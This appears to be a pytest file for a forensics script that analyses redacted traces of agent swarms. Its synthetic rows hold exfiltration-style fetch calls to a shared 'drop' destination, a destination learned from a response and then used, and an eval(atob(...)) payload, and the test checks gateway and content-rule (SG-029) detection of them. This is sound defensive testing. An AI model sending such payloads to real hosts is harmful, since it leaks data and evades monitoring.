"""Swarm Traces forensics on a tiny synthetic file shaped like the real (redacted) data."""
import gzip
import importlib.util
import json
from pathlib import Path

spec = importlib.util.spec_from_file_location(
    "stf", Path(__file__).resolve().parents[1] / "scripts" / "swarm_traces_forensics.py")
stf = importlib.util.module_from_spec(spec)
spec.loader.exec_module(stf)


def row(i, kind, text, parent="None"):
    return {"id": f"R{i}", "cite": "-", "kind": kind, "parent_id": parent, "time_utc": "None", "tags": "", "text": text}


def test_who_talked_to_whom_spread_and_gateway(tmp_path):
    d1, d2 = "[REDACTED:destination:000001]", "[REDACTED:destination:000002]"
    ident = lambda n: f"[REDACTED:runtime_identifier:{n:06d}]"  # noqa: E731
    data = [row(i, "payload", f"fetch('https://{d1}', {{id: '{ident(i)}'}})") for i in range(1, 5)]  # 4 agents, 1 drop
    data += [row(5, "response", f"next hop {d2}", parent="R1"),            # learned from a response...
             row(6, "payload", f"fetch('https://{d2}', {{id: '{ident(9)}'}})"),  # ...then used
             row(7, "payload", f"eval(atob('x')) {d2} {ident(9)}")]        # content-shaped, SG-029
    p = tmp_path / "t.jsonl.gz"
    with gzip.open(p, "wt", encoding="utf-8") as f:
        f.write("\n".join(json.dumps(r) for r in data))
    r = stf.analyse(p, k=3)
    w = r["who_talked_to_whom"]
    assert w["identifiers"] == 5 and w["destinations_shared_by_2plus_identifiers"] == 1
    assert w["largest_clusters"][0] == 4  # the four agents sharing the drop point are one cluster
    assert r["spread"]["destinations_learned_then_used"] == 1
    g = r["gateway_vs_content"]
    assert g["gateway_flagged_payloads"] == 1  # the 4th caller of an already-shared destination
    assert g["sg029_flagged_payloads"] == 1 and g["flagged_by_both"] == 0
